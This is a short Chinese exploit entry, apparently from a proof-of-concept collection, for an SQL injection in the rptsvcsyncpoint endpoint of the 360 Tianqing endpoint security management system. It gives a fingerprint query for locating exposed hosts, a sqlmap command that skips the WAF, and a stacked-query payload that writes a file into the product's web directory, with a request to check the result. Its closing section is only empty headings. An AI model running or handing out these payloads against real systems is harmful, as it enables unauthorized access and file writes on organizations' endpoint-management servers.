# 360天擎终端安全管理系统rptsvcsyncpoint存在SQL注入漏洞

- **系统**：360天擎终端安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="天擎终端安全管理系统"`
- **请求**：`http://xx.xx.xx.xx/stc.txt`

**请求体 / payload**
```
sqlmap
python3 sqlmap.py -u "https://xx.xx.xx.xx/api/dp/rptsvcsyncpoint?ccid=1" --batch --skip-waf

文件写入
/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('123456~');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\stc.txt';drop table O;--

写入文件位置
```

**其他**
- 360天擎终端安全管理系统rptsvcsyncpoint存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 360天擎终端安全管理系统